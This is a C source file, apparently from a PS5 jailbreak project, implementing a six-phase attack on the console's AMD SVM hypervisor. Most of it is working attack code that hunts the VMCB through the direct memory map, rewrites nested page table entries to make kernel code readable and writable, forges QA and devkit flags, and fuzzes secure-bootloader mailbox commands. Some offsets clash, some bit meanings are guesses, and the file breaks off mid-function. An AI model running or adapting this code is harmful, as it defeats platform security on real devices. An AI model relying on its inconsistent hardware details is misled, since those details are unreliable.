/*
 * hv_break.c - PS5 Hypervisor Attack Toolkit for FW 3.00+ (targeting 4.03)
 *
 * Multi-strategy hypervisor bypass payload. Chains 6 attack phases to
 * find and modify the AMD SVM Nested Page Tables (NPT) that enforce
 * execute-only (XOM) on kernel .text.
 *
 * === Attack Strategy Overview ===
 *
 * Phase 1: MSR Probing
 *   Read SVM-related MSRs (VM_HSAVE_PA, VM_CR, EFER) via kekcall RDMSR.
 *   If VM_HSAVE_PA is readable, it gives us the physical address of the
 *   VMCB save area. The VMCB contains the NPT root (N_CR3).
 *
 * Phase 2: VMCB Hunt via DMAP
 *   Even if MSRs are trapped, scan physical memory through DMAP looking
 *   for the VMCB. We know the guest CR3, which appears at offset 0x550
 *   in the VMCB save area. Scan DMAP pages for our known CR3 value.
 *
 * Phase 3: NPT Walk & Modification
 *   If we find N_CR3 (the nested page table root), walk it to find the
 *   PTEs for kernel .text physical pages. Clear the XOM bits and set
 *   read+write permission. This is the actual hypervisor bypass.
 *
 * Phase 4: QA Flag / Security Flag Manipulation
 *   Write known QA/debug flag combinations and trigger suspend/resume.
 *   The hypervisor may relax NPT enforcement based on these flags.
 *   Byepervisor-derived approach.
 *
 * Phase 5: SBL Mailbox Command Fuzzing
 *   Send crafted messages through sceSblServiceMailbox to discover
 *   undocumented hypervisor commands that might modify NPT permissions.
 *
 * Phase 6: Direct NPT PTE Brute Force
 *   If we can locate any NPT PTE through DMAP scanning, attempt to
 *   modify it directly. Even without finding N_CR3, pattern-matching
 *   NPT entries by their permission bits can locate the XOM entries.
 *
 * === Prerequisites ===
 *
 *   - kstuff must be loaded (provides kekcall, kernel r/w)
 *   - prosper0gdb initialized (provides r0gdb primitives)
 *   - FW 3.00+ (pre-3.00 has Byepervisor)
 *
 * === Build ===
 *
 *   Built as part of kstuff: cd ps5-kstuff && make
 *   Or standalone with prosper0gdb linkage.
 */

#define sysctl __sysctl
#include <sys/types.h>
#include <sys/mman.h>
#include <sys/sysctl.h>
#include <sys/stat.h>
#include <signal.h>
#include <stdint.h>
#include <stdarg.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdbool.h>
#include "../prosper0gdb/r0gdb.h"
#include "../prosper0gdb/offsets.h"
#include "../gdb_stub/dbg.h"

/* ================================================================
 * CONFIGURATION
 * ================================================================ */

/* Network listener for results (set to your PC's IP) */
#define LISTENER_IP     "0.0.0.0"
#define LISTENER_PORT   9999

/* DMAP scan range: how much physical memory to scan (in GB) */
#define DMAP_SCAN_GB    8

/* Max number of VMCB candidates to track */
#define MAX_VMCB_CANDIDATES 64

/* Max NPT entries to collect */
#define MAX_NPT_ENTRIES 4096

/* ================================================================
 * AMD SVM Constants
 * ================================================================ */

/* SVM-related MSRs */
#define MSR_EFER            0xC0000080
#define MSR_VM_CR           0xC0010114
#define MSR_IGNNE           0xC0010115
#define MSR_SMM_CTL         0xC0010116
#define MSR_VM_HSAVE_PA     0xC0010117
#define MSR_SVM_KEY         0xC0010118
#define MSR_SMM_ADDR        0xC0010112
#define MSR_SMM_MASK        0xC0010113
#define MSR_PAT             0x00000277
#define MSR_STAR            0xC0000081
#define MSR_LSTAR           0xC0000082
#define MSR_SFMASK          0xC0000084
#define MSR_FS_BASE         0xC0000100
#define MSR_GS_BASE         0xC0000101
#define MSR_KERNEL_GS_BASE  0xC0000102

/* VMCB Control Area offsets */
#define VMCB_CR_INTERCEPTS      0x010
#define VMCB_DR_INTERCEPTS      0x014
#define VMCB_EXCEPTION_INTERCEPTS 0x018
#define VMCB_MISC_INTERCEPTS_1  0x00C
#define VMCB_MISC_INTERCEPTS_2  0x010
#define VMCB_PAUSE_FILTER_THRESHOLD 0x03C
#define VMCB_PAUSE_FILTER_COUNT 0x03E
#define VMCB_IOPM_BASE_PA      0x040
#define VMCB_MSRPM_BASE_PA     0x048
#define VMCB_TSC_OFFSET        0x050
#define VMCB_TLB_CONTROL       0x058
#define VMCB_VINTR             0x060
#define VMCB_INTERRUPT_SHADOW  0x068
#define VMCB_EXITCODE          0x070
#define VMCB_EXITINFO1         0x078
#define VMCB_EXITINFO2         0x080
#define VMCB_EXITINTINFO       0x088
#define VMCB_NP_ENABLE         0x090  /* bit 0 = nested paging */
#define VMCB_AVIC_VAPIC_BAR    0x098
#define VMCB_GHCB_PA           0x0A0
#define VMCB_EVENT_INJ         0x0A8
#define VMCB_N_CR3             0x0B0  /* Nested CR3 = NPT root */
#define VMCB_LBR_VIRT_ENABLE   0x0B8
#define VMCB_VMCB_CLEAN        0x0C0
#define VMCB_NRIP              0x0C8
#define VMCB_GUEST_INST_BYTES  0x0D0

/* VMCB Save Area offsets (from VMCB base + 0x400) */
#define VMCB_SAVE_AREA         0x400
#define VMCB_SAVE_CR0          (VMCB_SAVE_AREA + 0x048)
#define VMCB_SAVE_CR2          (VMCB_SAVE_AREA + 0x050)
#define VMCB_SAVE_CR3          (VMCB_SAVE_AREA + 0x058)
#define VMCB_SAVE_CR4          (VMCB_SAVE_AREA + 0x060)
#define VMCB_SAVE_DR6          (VMCB_SAVE_AREA + 0x068)
#define VMCB_SAVE_DR7          (VMCB_SAVE_AREA + 0x070)
#define VMCB_SAVE_EFER         (VMCB_SAVE_AREA + 0x0D0)
#define VMCB_SAVE_RAX          (VMCB_SAVE_AREA + 0x1F8)
#define VMCB_SAVE_RSP          (VMCB_SAVE_AREA + 0x1D8)
#define VMCB_SAVE_RIP          (VMCB_SAVE_AREA + 0x178)

/* Page table bits */
#define PTE_PRESENT  (1ULL << 0)
#define PTE_RW       (1ULL << 1)
#define PTE_USER     (1ULL << 2)
#define PTE_PS       (1ULL << 7)   /* huge page (2MB/1GB) */
#define PTE_NX       (1ULL << 63)
#define PTE_XOTEXT   (1ULL << 58)  /* PS5 custom execute-only bit */
#define PTE_ADDR_MASK 0x000FFFFFFFFFF000ULL

/* Kernel text range */
#define KTEXT_BASE  0xffffffff80000000ULL
#define KTEXT_END   0xffffffff83000000ULL
#define KDATA_BASE  0xffffffff83000000ULL

/* ================================================================
 * Globals
 * ================================================================ */

extern uint64_t kdata_base;
extern void kmemcpy(void *dst, const void *src, size_t sz);

/* Results structure sent to listener */
#pragma pack(push, 1)
struct hv_results {
    char     magic[8];          /* "HVBREAK\0" */
    uint32_t fw_version;
    uint32_t phase_reached;     /* highest phase completed */

    /* Phase 1: MSR results */
    uint64_t msr_efer;
    uint64_t msr_vm_cr;
    uint64_t msr_vm_hsave_pa;
    uint64_t msr_lstar;
    uint64_t msr_star;
    uint32_t msr_efer_ok;      /* 1 if read succeeded */
    uint32_t msr_vm_cr_ok;
    uint32_t msr_vm_hsave_pa_ok;

    /* Phase 2: VMCB hunt results */
    uint64_t guest_cr3;
    uint64_t dmap_base;
    uint32_t vmcb_candidates_found;
    uint64_t vmcb_candidates[MAX_VMCB_CANDIDATES];

    /* Phase 3: NPT results */
    uint64_t ncr3;             /* nested CR3 if found */
    uint32_t ncr3_found;
    uint32_t npt_entries_found;
    uint64_t npt_ktext_ptes[64]; /* NPT PTEs for kernel .text pages */
    uint32_t npt_modified;     /* 1 if we successfully modified NPT */

    /* Phase 4: QA flag results */
    uint64_t orig_security_flags;
    uint64_t orig_qa_flags;
    uint64_t orig_utoken;
    uint32_t qa_attack_attempted;

    /* Phase 5: Mailbox results */
    uint32_t mailbox_commands_tested;
    uint32_t mailbox_interesting[32]; /* command IDs that didn't error */

    /* Phase 6: Brute force results */
    uint32_t xom_ptes_found;
    uint64_t xom_pte_addrs[64];
    uint64_t xom_pte_values[64];
};
#pragma pack(pop)

static struct hv_results results;

/* ================================================================
 * Notification helper
 * ================================================================ */

static void notify(const char *s) {
    struct {
        char pad1[0x10];
        int f1;
        char pad2[0x19];
        char msg[0xc03];
    } notification = {.f1 = -1};
    char *d = notification.msg;
    while ((*d++ = *s++));
    int fd = open("/dev/notification0", 1);
    if (fd >= 0) {
        write(fd, &notification, 0xc30);
        close(fd);
    }
}

static void notify_fmt(const char *fmt, ...) {
    char buf[256];
    /* Simple integer-only formatter since we can't link full printf */
    const char *s = fmt;
    char *d = buf;
    char *end = buf + sizeof(buf) - 1;
    while (*s && d < end) {
        *d++ = *s++;
    }
    *d = 0;
    notify(buf);
}

/* Integer to hex string */
static void hex64(char *buf, uint64_t v) {
    const char *hex = "0123456789abcdef";
    buf[0] = '0'; buf[1] = 'x';
    for (int i = 15; i >= 0; i--) {
        buf[2 + (15 - i)] = hex[(v >> (i * 4)) & 0xF];
    }
    buf[18] = 0;
}

/* ================================================================
 * Phase 1: MSR Probing
 *
 * Read SVM MSRs via kekcall RDMSR. The kekcall mechanism uses
 * kstuff's getppid hook at ring 0. RDMSR in the guest may be
 * intercepted by the hypervisor (MSRPM bitmap), but some MSRs
 * may be passed through.
 *
 * If VM_HSAVE_PA is readable, it gives us the physical address
 * of the VMCB host save area. Near this address is the guest VMCB.
 * ================================================================ */

#define KEKCALL_RDMSR 0x300000027ULL

static uint64_t safe_rdmsr(uint32_t msr, int *ok) {
    /*
     * kekcall RDMSR: rdi = MSR number, returns MSR value in rax.
     * If the MSR read causes #GP (trapped by HV or invalid MSR),
     * kstuff's #GP handler will skip the instruction. We detect
     * failure by checking if the return value looks like an error
     * sentinel or if the kekcall itself returns an error code.
     *
     * Since kstuff's INT13 handler catches #GP and does RIP += 2
     * for RDMSR (which is 2 bytes: 0F 32), and RAX is set to 0
     * on the #GP path, a return of 0 might be valid or might be
     * a caught fault. We try twice and check consistency.
     */
    uint64_t val1 = kekcall(msr, 0, 0, 0, 0, 0, KEKCALL_RDMSR);
    uint64_t val2 = kekcall(msr, 0, 0, 0, 0, 0, KEKCALL_RDMSR);

    if (val1 == val2 && val1 != (uint64_t)-1) {
        *ok = 1;
        return val1;
    }

    /* If values differ, the MSR read might be causing side effects
     * or being intercepted differently each time. Still report it. */
    *ok = (val1 == val2) ? 1 : 0;
    return val1;
}

static void phase1_msr_probe(void) {
    notify("[HV] Phase 1: MSR Probing...");

    int ok;

    /* EFER - Extended Feature Enable Register */
    results.msr_efer = safe_rdmsr(MSR_EFER, &ok);
    results.msr_efer_ok = ok;

    /* VM_CR - SVM control register */
    results.msr_vm_cr = safe_rdmsr(MSR_VM_CR, &ok);
    results.msr_vm_cr_ok = ok;

    /* VM_HSAVE_PA - Physical address of host save area */
    results.msr_vm_hsave_pa = safe_rdmsr(MSR_VM_HSAVE_PA, &ok);
    results.msr_vm_hsave_pa_ok = ok;

    /* Supplementary MSRs for context */
    results.msr_lstar = safe_rdmsr(MSR_LSTAR, &ok);
    results.msr_star = safe_rdmsr(MSR_STAR, &ok);

    results.phase_reached = 1;

    char msg[128] = "[HV] P1: EFER=";
    char hex[20];
    hex64(hex, results.msr_efer);
    char *p = msg;
    while (*p) p++;
    char *h = hex;
    while (*h) *p++ = *h++;
    *p = 0;
    notify(msg);
}

/* ================================================================
 * Phase 2: VMCB Hunt via DMAP
 *
 * The VMCB save area (offset 0x400 from VMCB base) contains the
 * guest CR3 at a known offset. We know our guest CR3, so we scan
 * physical memory (accessible through DMAP) for pages that contain
 * our CR3 value at the VMCB_SAVE_CR3 offset.
 *
 * Additionally, the VMCB control area has NP_ENABLE (should be 1
 * if nested paging is on) and N_CR3 (the NPT root). We can
 * validate candidates by checking these fields.
 *
 * DMAP = direct map of all physical memory, accessible from kernel.
 * On PS5: dmap_base = kernel_pmap.pm_cr3_store[0] - kernel_pmap.pm_cr3_store[1]
 * ================================================================ */

static void phase2_vmcb_hunt(void) {
    notify("[HV] Phase 2: VMCB Hunt via DMAP...");

    /* Get DMAP base and guest CR3 */
    results.dmap_base = get_dmap_base();
    results.guest_cr3 = r0gdb_read_cr3();

    uint64_t dmap = results.dmap_base;
    uint64_t cr3 = results.guest_cr3;
    uint64_t scan_bytes = (uint64_t)DMAP_SCAN_GB << 30;
    uint32_t candidates = 0;

    /*
     * Strategy 1: Scan for guest CR3 in VMCB save area position.
     *
     * The VMCB is page-aligned (4KB). The save area starts at +0x400.
     * CR3 is at save area + 0x058 = VMCB + 0x458.
     *
     * We scan every page in physical memory, reading 8 bytes at the
     * VMCB_SAVE_CR3 offset, looking for our known guest CR3 value.
     */
    for (uint64_t phys = 0; phys < scan_bytes && candidates < MAX_VMCB_CANDIDATES; phys += 0x1000) {
        uint64_t dmap_addr = dmap + phys + VMCB_SAVE_CR3;
        uint64_t val = 0;

        /* Use copyout to safely read - will return error if unmapped */
        if (copyout(&val, dmap_addr, 8) != 0)
            continue;

        if (val != cr3)
            continue;

        /* Candidate found! Validate by checking NP_ENABLE */
        uint64_t vmcb_base_dmap = dmap + phys;
        uint64_t np_enable = 0;
        if (copyout(&np_enable, vmcb_base_dmap + VMCB_NP_ENABLE, 8) != 0)
            continue;

        /* NP_ENABLE bit 0 should be set if nested paging is active */
        if (!(np_enable & 1))
            continue;

        /* Read N_CR3 (nested CR3) */
        uint64_t ncr3 = 0;
        copyout(&ncr3, vmcb_base_dmap + VMCB_N_CR3, 8);

        /* N_CR3 should be a valid physical address (non-zero, page-aligned) */
        if (ncr3 == 0 || (ncr3 & 0xFFF) != 0)
            continue;

        /* Strong candidate! Record it */
        results.vmcb_candidates[candidates] = phys;
        candidates++;

        /* If this is the first good candidate, use it */
        if (!results.ncr3_found && ncr3 != 0) {
            results.ncr3 = ncr3;
            results.ncr3_found = 1;
        }
    }

    results.vmcb_candidates_found = candidates;

    /*
     * Strategy 2: If VM_HSAVE_PA was readable, check that address.
     * VM_HSAVE_PA points to the host save area, but the guest VMCB
     * is typically nearby (same page or adjacent pages).
     */
    if (results.msr_vm_hsave_pa_ok && results.msr_vm_hsave_pa != 0) {
        uint64_t hsave_phys = results.msr_vm_hsave_pa;

        /* Check pages around VM_HSAVE_PA */
        for (int64_t delta = -16; delta <= 16; delta++) {
            uint64_t probe_phys = hsave_phys + delta * 0x1000;
            uint64_t probe_dmap = dmap + probe_phys;

            uint64_t save_cr3 = 0;
            if (copyout(&save_cr3, probe_dmap + VMCB_SAVE_CR3, 8) != 0)
                continue;

            if (save_cr3 == cr3) {
                uint64_t np = 0;
                copyout(&np, probe_dmap + VMCB_NP_ENABLE, 8);
                if (np & 1) {
                    uint64_t ncr3 = 0;
                    copyout(&ncr3, probe_dmap + VMCB_N_CR3, 8);
                    if (ncr3 && (ncr3 & 0xFFF) == 0) {
                        results.ncr3 = ncr3;
                        results.ncr3_found = 1;
                        if (candidates < MAX_VMCB_CANDIDATES)
                            results.vmcb_candidates[candidates++] = probe_phys;
                    }
                }
            }
        }
        results.vmcb_candidates_found = candidates;
    }

    results.phase_reached = 2;

    char msg[64] = "[HV] P2: Found ";
    char *p = msg;
    while (*p) p++;
    *p++ = '0' + (candidates / 10) % 10;
    *p++ = '0' + candidates % 10;
    char *s = " VMCB candidates";
    while (*s) *p++ = *s++;
    *p = 0;
    notify(msg);
}

/* ================================================================
 * Phase 3: NPT Walk & Modification
 *
 * If we found N_CR3 (the nested page table root), walk the NPT
 * to find PTEs for kernel .text physical pages. Then attempt to:
 *   1. Clear the XOM/execute-only bits
 *   2. Set the read (present) bit
 *   3. Optionally set the write bit
 *
 * The NPT uses the same 4-level paging structure as regular x86-64:
 *   PML4 -> PDPT -> PD -> PT
 * But the entries control nested (physical-to-machine) translation,
 * not virtual-to-physical.
 *
 * On PS5, kernel .text virtual addresses are 0xffffffff80000000+.
 * Their physical addresses can be found via guest page table walk.
 * The NPT then maps these physical addresses with XOM enforcement.
 * ================================================================ */

static uint64_t npt_walk_entry(uint64_t dmap, uint64_t table_phys,
                                uint64_t addr, int level) {
    /* level: 4=PML4, 3=PDPT, 2=PD, 1=PT */
    int shift = 12 + 9 * (level - 1);
    int index = (addr >> shift) & 0x1FF;
    uint64_t entry_addr = dmap + table_phys + index * 8;
    uint64_t entry = 0;
    copyout(&entry, entry_addr, 8);
    return entry;
}

static void phase3_npt_modify(void) {
    if (!results.ncr3_found) {
        notify("[HV] P3: Skipped - no N_CR3 found");
        return;
    }

    notify("[HV] Phase 3: NPT Walk & Modification...");

    uint64_t dmap = results.dmap_base;
    uint64_t ncr3 = results.ncr3;
    uint32_t entries_found = 0;

    /*
     * First, find the physical addresses of kernel .text pages.
     * Walk the guest page tables (using guest CR3) to translate
     * kernel virtual addresses to physical addresses.
     */
    uint64_t guest_cr3 = results.guest_cr3;

    for (uint64_t kva = KTEXT_BASE; kva < KTEXT_END && entries_found < 64; kva += 0x200000) {
        /* Walk guest page tables to find physical address of this VA */
        uint64_t phys = virt2phys(kva, NULL, dmap, guest_cr3);
        if (phys == (uint64_t)-1)
            continue;

        /* Now walk the NPT to find the entry for this physical address */
        uint64_t pml4e = npt_walk_entry(dmap, ncr3, phys, 4);
        if (!(pml4e & PTE_PRESENT))
            continue;

        uint64_t pdpte = npt_walk_entry(dmap, pml4e & PTE_ADDR_MASK, phys, 3);
        if (!(pdpte & PTE_PRESENT))
            continue;

        /* Check for 1GB huge page */
        if (pdpte & PTE_PS) {
            results.npt_ktext_ptes[entries_found++] = pdpte;
            continue;
        }

        uint64_t pde = npt_walk_entry(dmap, pdpte & PTE_ADDR_MASK, phys, 2);
        if (!(pde & PTE_PRESENT))
            continue;

        /* Check for 2MB huge page (common for kernel .text) */
        if (pde & PTE_PS) {
            results.npt_ktext_ptes[entries_found++] = pde;

            /*
             * ATTEMPT THE BYPASS: Modify the NPT PDE to allow reads.
             *
             * Original: Execute-only (no read, no write)
             * Target:   Read + Execute (add read permission)
             *
             * If XOTEXT bit (58) is set, clear it.
             * Ensure PTE_PRESENT (bit 0) is set for read access.
             * Keep PTE_PS (bit 7) for 2MB page.
             *
             * NOTE: This write to DMAP physically modifies the NPT
             * entry in memory. However, the hypervisor may:
             *   a) Have the NPT pages marked read-only in its own page tables
             *   b) Use a TLB flush mechanism that detects modifications
             *   c) Validate NPT integrity on VMEXIT
             *
             * We attempt it anyway - this is the critical moment.
             */
            uint64_t new_pde = pde;
            new_pde |= PTE_PRESENT | PTE_RW;  /* add read + write */
            new_pde &= ~PTE_XOTEXT;           /* clear XOM bit */
            new_pde &= ~PTE_NX;               /* clear no-execute */

            /* Calculate the address of this PDE in DMAP */
            uint64_t pd_phys = pdpte & PTE_ADDR_MASK;
            int pd_index = (phys >> 21) & 0x1FF;
            uint64_t pde_dmap_addr = dmap + pd_phys + pd_index * 8;

            /* Write the modified entry */
            copyin(pde_dmap_addr, &new_pde, 8);

            /* Verify */
            uint64_t verify = 0;
            copyout(&verify, pde_dmap_addr, 8);
            if (verify == new_pde) {
                results.npt_modified = 1;
            }
            continue;
        }

        /* 4KB pages */
        uint64_t pte = npt_walk_entry(dmap, pde & PTE_ADDR_MASK, phys, 1);
        if (!(pte & PTE_PRESENT))
            continue;

        results.npt_ktext_ptes[entries_found++] = pte;

        /* Attempt 4KB PTE modification */
        uint64_t new_pte = pte;
        new_pte |= PTE_PRESENT | PTE_RW;
        new_pte &= ~PTE_XOTEXT;
        new_pte &= ~PTE_NX;

        uint64_t pt_phys = pde & PTE_ADDR_MASK;
        int pt_index = (phys >> 12) & 0x1FF;
        uint64_t pte_dmap_addr = dmap + pt_phys + pt_index * 8;

        copyin(pte_dmap_addr, &new_pte, 8);

        uint64_t verify = 0;
        copyout(&verify, pte_dmap_addr, 8);
        if (verify == new_pte) {
            results.npt_modified = 1;
        }
    }

    results.npt_entries_found = entries_found;
    results.phase_reached = 3;

    if (results.npt_modified) {
        notify("[HV] P3: NPT MODIFIED - attempting .text read...");

        /* TEST: Try to read kernel .text via copyout */
        uint64_t test_buf[2] = {0};
        if (copyout(test_buf, KTEXT_BASE, 16) == 0 &&
            (test_buf[0] != 0 || test_buf[1] != 0)) {
            notify("[HV] *** KERNEL .TEXT IS READABLE ***");
        } else {
            notify("[HV] P3: NPT write succeeded but .text still unreadable (TLB?)");
            /*
             * If the write stuck but .text is still unreadable, the
             * hypervisor's TLB hasn't been flushed. A VMEXIT/VMRUN
             * cycle would flush it. Try triggering one:
             */
            /* Trigger VMEXIT via CPUID (always causes VMEXIT on SVM) */
            uint32_t eax, ebx, ecx, edx;
            __asm__ volatile("cpuid"
                : "=a"(eax), "=b"(ebx), "=c"(ecx), "=d"(edx)
                : "a"(0), "c"(0));

            /* Re-test */
            test_buf[0] = test_buf[1] = 0;
            if (copyout(test_buf, KTEXT_BASE, 16) == 0 &&
                (test_buf[0] != 0 || test_buf[1] != 0)) {
                notify("[HV] *** KERNEL .TEXT READABLE AFTER TLB FLUSH ***");
            }
        }
    } else {
        notify("[HV] P3: Could not modify NPT entries");
    }
}

/* ================================================================
 * Phase 4: QA Flag / Security Flag Manipulation
 *
 * The PS5 has several security-related flags in kernel .data:
 *   - security_flags: controls various security enforcement
 *   - targetid: device type identifier
 *   - qa_flags: QA/debug mode flags
 *   - utoken: user authentication token
 *
 * Byepervisor (on FW < 3.0) used QA flags to modify hypervisor
 * behavior during suspend/resume. The theory: if QA flags indicate
 * a development unit, the HV might relax NPT enforcement.
 *
 * This phase writes known flag combinations and reports results.
 * A full attack would trigger suspend/resume after each write.
 * ================================================================ */

static void phase4_qa_flags(void) {
    notify("[HV] Phase 4: QA/Security Flag Probing...");

    /* Read current values */
    copyout(&results.orig_security_flags, offsets.security_flags, 8);
    copyout(&results.orig_qa_flags, offsets.qa_flags, 8);
    copyout(&results.orig_utoken, offsets.utoken, 8);

    /*
     * QA flag values that might affect hypervisor behavior:
     *
     * Known QA flag bits (from Byepervisor and public research):
     *   Bit 0:  Allow debug settings
     *   Bit 1:  Allow kernel debug
     *   Bit 2:  Allow devkit-like behavior
     *   Bit 4:  Disable ASLR
     *   Bit 8:  Allow unsigned code
     *   Bit 13: Internal flag (seen on devkits)
     *
     * Security flags:
     *   0x01: Retail mode
     *   0x10: Arcade mode
     *   0x14: QA mode
     *   0x40: Debug mode
     *
     * TargetID:
     *   0x82: Retail
     *   0x84: Devkit
     *   0xAA: Testing internal
     *   0xFF: Factory
     */

    /* Write QA flags that indicate devkit/debug mode */
    uint8_t qa_test[] = {
        0xFF, 0xFF, 0x00, 0x00, 0xFF, 0xFF, 0x00, 0x00,
        0xFF, 0xFF, 0x00, 0x00, 0xFF, 0xFF, 0x00, 0x00
    };
    copyin(offsets.qa_flags, qa_test, sizeof(qa_test));

    /* Write security flags to indicate QA mode */
    uint64_t sec_flags = 0x14;
    copyin(offsets.security_flags, &sec_flags, 4);

    /* Write targetid to devkit */
    uint8_t targetid = 0x84;
    copyin(offsets.targetid, &targetid, 1);

    /* Verify writes */
    uint8_t verify_qa[16] = {0};
    copyout(verify_qa, offsets.qa_flags, sizeof(verify_qa));
    uint32_t verify_sec = 0;
    copyout(&verify_sec, offsets.security_flags, 4);
    uint8_t verify_tid = 0;
    copyout(&verify_tid, offsets.targetid, 1);

    results.qa_attack_attempted = 1;
    results.phase_reached = 4;

    if (verify_sec == 0x14 && verify_tid == 0x84) {
        notify("[HV] P4: QA/Security flags written. Trigger rest mode for HV reinit.");
        /*
         * NOTE: To complete this attack, the user must:
         *   1. Enter rest mode (suspend)
         *   2. Resume
         *   3. Re-run the exploit
         *
         * On resume, the hypervisor reinitializes. If it checks
         * QA flags to determine NPT policy, XOM may be relaxed.
         *
         * This is exactly what Byepervisor did for FW < 3.0.
         * Whether it works on 3.0+ depends on whether Sony
         * removed the flag check from the new hypervisor.
         */
    } else {
        /* Restore original values */
        copyin(offsets.security_flags, &results.orig_security_flags, 8);
        copyin(offsets.qa_flags, &results.orig_qa_flags, 8);
        copyin(offsets.utoken, &results.orig_utoken, 8);
        notify("[HV] P4: Flag write failed, restored originals");
    }
}

/* ================================================================
 * Phase 5: SBL Mailbox Command Fuzzing
 *
 * sceSblServiceMailbox is the kernel's interface to the Secure
 * Boot Loader / hypervisor. It sends 128-byte messages to the
 * SBL service and receives responses.
 *
 * Known commands (from Byepervisor / public research):
 *   0x01: SM_VERIFY_HEADER
 *   0x02: SM_LOAD_SELF_SEGMENT
 *   0x04: SM_DECRYPT_SELF_BLOCK
 *   0x05: SM_DECRYPT_MULTIPLE_SELF_BLOCKS
 *   0x06: SM_FINALIZE
 *   0x0A: SM_VERIFY_SUPER_BLOCK
 *   0x0C: SM_CLEAR_PFS_KEY_1
 *   0x0D: SM_CLEAR_PFS_KEY_2
 *   0x0F: SM_SET_PFS_KEYS
 *   0x10: SM_NPDRM_CMD_5
 *   0x11: SM_NPDRM_CMD_6
 *
 * We test all commands 0x00-0xFF to find any that:
 *   - Return success (might be undocumented functionality)
 *   - Don't cause a panic
 *   - Return data that reveals HV state
 * ================================================================ */

static void phase5_mailbox_fuzz(void) {
    notify("[HV] Phase 5: SBL Mailbox Probing...");

    uint32_t interesting = 0;

    /* sceSblServiceMailbox takes a service ID and a 128-byte message buffer.
     * We call it via r0gdb_kfncall to invoke the kernel function directly. */
    for (uint32_t cmd = 0; cmd < 256 && interesting < 32; cmd++) {
        /* Build a minimal message: command ID at offset 0, rest zeroed */
        char msg[128];
        __builtin_memset(msg, 0, sizeof(msg));
        msg[0] = cmd & 0xFF;
        msg[1] = (cmd >> 8) & 0xFF;

        /* Allocate kernel buffer for the message */
        uint64_t kbuf = r0gdb_kmalloc(128);
        if (!kbuf) continue;

        copyin(kbuf, msg, 128);

        /* Call sceSblServiceMailbox(service_id, msg_buf) */
        int64_t ret = r0gdb_kfncall(offsets.sceSblServiceMailbox, kbuf, 0, 0, 0, 0);

        /* Read back the response (mailbox may modify the buffer in-place) */
        char response[128];
        copyout(response, kbuf, 128);

        kfree(kbuf);

        /* Check if this command did something interesting */
        if (ret == 0 || (ret > 0 && ret < 0x80000000)) {
            results.mailbox_interesting[interesting++] = cmd;
        }

        results.mailbox_commands_tested = cmd + 1;
    }

    results.phase_reached = 5;

    char msg2[64] = "[HV] P5: Found ";
    char *p = msg2;
    while (*p) p++;
    *p++ = '0' + (interesting / 10) % 10;
    *p++ = '0' + interesting % 10;
    char *s = " interesting mailbox cmds";
    while (*s) *p++ = *s++;
    *p = 0;
    notify(msg2);
}

/* ================================================================
 * Phase 6: NPT PTE Brute Force via DMAP Pattern Matching
 *
 * Even without finding the VMCB/N_CR3, we can search DMAP for
 * page table entries that look like NPT entries for kernel .text.
 *
 * Kernel .text physical addresses are in a known range. NPT entries
 * for these addresses would have:
 *   - Physical address pointing to kernel .text physical range
 *   - Present bit set
 *   - Possibly XOTEXT bit set (execute-only)
 *   - No user bit (kernel pages)
 *
 * We scan for 8-byte values matching this pattern and attempt to
 * modify them.
 * ================================================================ */

static void phase6_npt_bruteforce(void) {
    notify("[HV] Phase 6: NPT PTE Pattern Scan...");

    uint64_t dmap = results.dmap_base;
    uint64_t guest_cr3 = results.guest_cr3;
    uint32_t found = 0;

    /*
     * Find the physical address range of kernel .text.
     * Walk guest page tables for a few .text addresses.
     */
    uint64_t ktext_phys_start = virt2phys(KTEXT_BASE, NULL, dmap, guest_cr3);
    uint64_t ktext_phys_end = virt2phys(KTEXT_END - 0x1000, NULL, dmap, guest_cr3);

    if (ktext_phys_start == (uint64_t)-1 || ktext_phys_end == (uint64_t)-1) {
        notify("[HV] P6: Cannot determine .text physical range");
        results.phase_reached = 6;
        return;
    }

    /* Ensure start < end */
    if (ktext_phys_start > ktext_phys_end) {
        uint64_t tmp = ktext_phys_start;
        ktext_phys_start = ktext_phys_end;
        ktext_phys_end = tmp;
    }

    /* Align to 2MB boundaries for PDE matching */
    uint64_t phys_2m_start = ktext_phys_start & ~0x1FFFFFULL;
    uint64_t phys_2m_end = (ktext_phys_end + 0x1FFFFF) & ~0x1FFFFFULL;

    /*
     * Scan DMAP for page-table-like structures containing entries
     * that point to the kernel .text physical range.
     *
     * A 2MB PDE would look like: phys_addr | PS | PRESENT [| XOTEXT]
     * where phys_addr is aligned to 2MB and in the .text phys range.
     */
    uint64_t scan_bytes = (uint64_t)DMAP_SCAN_GB << 30;

    for (uint64_t phys_page = 0; phys_page < scan_bytes && found < 64; phys_page += 0x1000) {
        /* Read a full page of potential PTE values */
        uint64_t entries[512];
        if (copyout(entries, dmap + phys_page, 4096) != 0)
            continue;

        for (int i = 0; i < 512 && found < 64; i++) {
            uint64_t entry = entries[i];

            /* Skip non-present entries */
            if (!(entry & PTE_PRESENT))
                continue;

            uint64_t entry_phys = entry & PTE_ADDR_MASK;

            /* Check if this is a 2MB PDE pointing to .text physical range */
            if (entry & PTE_PS) {
                uint64_t entry_2m = entry & ~0x1FFFFFULL & PTE_ADDR_MASK;
                if (entry_2m >= phys_2m_start && entry_2m < phys_2m_end) {
                    /* Check for XOM signature: present + execute but no read/write
                     * On AMD SVM NPT: bit 0 = read, bit 1 = write, execute is allowed
                     * if NX (bit 63) is NOT set. XOM = !NX && !read maybe?
                     * PS5 might use custom XOTEXT bit (58). */
                    if ((entry & PTE_XOTEXT) || !(entry & PTE_RW)) {
                        results.xom_pte_addrs[found] = phys_page + i * 8;
                        results.xom_pte_values[found] = entry;
                        found++;

                        /* Attempt modification */
                        uint64_t new_entry = entry;
                        new_entry |= PTE_PRESENT | PTE_RW;
                        new_entry &= ~PTE_XOTEXT;
                        new_entry &= ~PTE_NX;

                        uint64_t addr = dmap + phys_page + i * 8;
                        copyin(addr, &new_entry, 8);
                    }
                }
            }

            /* Also check 4KB PTEs */
            if (!(entry & PTE_PS)) {
                if (entry_phys >= ktext_phys_start && entry_phys < ktext_phys_end) {
                    if ((entry & PTE_XOTEXT) || !(entry & PTE_RW)) {
                        if (found < 64) {
                            results.xom_pte_addrs[found] = phys_page + i * 8;
                            results.xom_pte_values[found] = entry;
                            found++;

                            uint64_t new_entry = entry;
                            new_entry |= PTE_PRESENT | PTE_RW;
                            new_entry &= ~PTE_XOTEXT;
                            new_entry &= ~PTE_NX;

                            uint64_t addr = dmap + phys_page + i * 8;
                            copyin(addr, &new_entry, 8);
                        }
                    }
                }
            }
        }
    }

